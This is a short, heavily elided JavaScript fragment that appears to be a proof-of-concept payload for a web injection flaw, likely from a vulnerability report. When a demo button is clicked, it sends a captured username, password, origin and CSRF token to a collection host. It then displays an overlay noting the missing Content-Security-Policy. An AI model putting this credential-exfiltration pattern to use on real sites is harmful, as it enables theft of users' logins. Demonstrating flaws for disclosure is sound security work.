...
(function () {
  ...
  d.getElementById('pocbtn').onclick = function () {
    ...
    send('stage2-creds', { origin: O, username: user, password: pass, csrf: passive.csrf || '' });
    ...
    html += '<div class="note">Both stages were sent to <b>' + C.replace('https://', '').replace('/', '') +
      ...
      'encoding and the response carries no Content-Security-Policy.</div></div>';
    ov.innerHTML = html;
  };
})();
